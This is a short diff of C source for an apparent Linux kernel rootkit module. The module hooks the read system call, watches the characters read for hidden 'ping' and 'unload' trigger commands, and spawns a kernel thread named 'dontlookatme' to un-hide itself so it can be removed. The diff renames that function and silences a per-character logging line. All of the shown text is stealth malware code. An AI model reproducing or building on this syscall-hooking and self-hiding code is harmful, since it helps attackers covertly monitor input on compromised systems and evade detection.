@@ -29,7 +29,7 @@ static ssize_t my_read(int fd, void *buf, size_t count){
             printk(KERN_INFO "pong\n");
           }else if(checkUnloadCommandCount == unloadCommandLen){
             //kthread_run(unhook_read, NULL, "dontlookatme");
-            kthread_run(unhide_code, NULL, "dontlookatme");
+            kthread_run(make_module_removable, NULL, "dontlookatme");
             printk(KERN_INFO "unload\n");      
           }
           checkPingCommandCount = 0;
@@ -48,7 +48,7 @@ static ssize_t my_read(int fd, void *buf, size_t count){
           }
           break;
         default:
-          printk(KERN_INFO "%d, %c\n", c, c);      
+          //printk(KERN_INFO "%d, %c\n", c, c);      
           if(checkPingCommandCount>=0 && checkPingCommandCount<pingCommandLen && c == pingCommand[checkPingCommandCount]){
             //printk(KERN_INFO "check ping count: %d\n", checkPingCommandCount);
             checkPingCommandCount++;
